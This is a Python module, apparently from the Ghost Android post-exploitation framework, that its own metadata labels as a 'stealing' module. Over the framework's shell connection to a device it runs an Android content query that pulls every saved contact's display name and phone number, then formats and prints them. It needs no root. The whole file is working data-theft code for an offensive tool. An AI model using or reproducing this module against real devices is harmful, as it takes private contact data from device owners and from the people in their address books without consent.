#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.badges import Badges


class GhostModule:
    def __init__(self, ghost):
        self.ghost = ghost
        self.badges = Badges()

        self.details = {
            'name': "view_contacts",
            'authors': ['jaxparrow07'],
            'description': "Show Contacts Saved on Device.",
            'usage': "view_contacts",
            'type': "stealing",
            'args': 0,
            'needs_args': False,
            'needs_root': False,
            'comments': ""
        }

    def run(self):
        print(self.badges.G + "Getting Contacts information...")
        output = self.ghost.send_command("shell",
                                         "content query --uri content://contacts/phones/  --projection display_name:number")
        output = output.replace('Row: ', '')
        output = output.replace(' display_name=', ' ')
        output = output.replace(', number=', ' : ')
        print(output)
